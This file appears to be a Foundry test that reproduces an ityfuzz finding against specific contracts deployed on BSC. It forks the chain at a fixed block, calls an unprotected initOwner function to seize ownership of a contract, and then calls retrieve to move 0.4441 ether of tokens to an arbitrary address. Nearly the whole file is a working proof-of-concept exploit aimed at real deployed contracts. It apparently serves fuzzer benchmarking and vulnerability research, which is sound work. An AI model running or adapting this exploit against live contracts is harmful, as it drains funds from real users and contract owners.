// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c -c bsc --onchain-block-number 23106506 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 0.004 ETH by interacting with the provided contracts

================ Trace ================
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   └─[1] 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4.initOwner(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024)
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4.retrieve(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0.4441 ether)


 */

contract C0fe2 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 23106506);
    }

    function test() public {
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        I(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4).initOwner(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4).retrieve(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0.4441 ether);
    }

}

interface I {
    function retrieve(address,address,uint256) external payable;
    function initOwner(address) external payable;
}
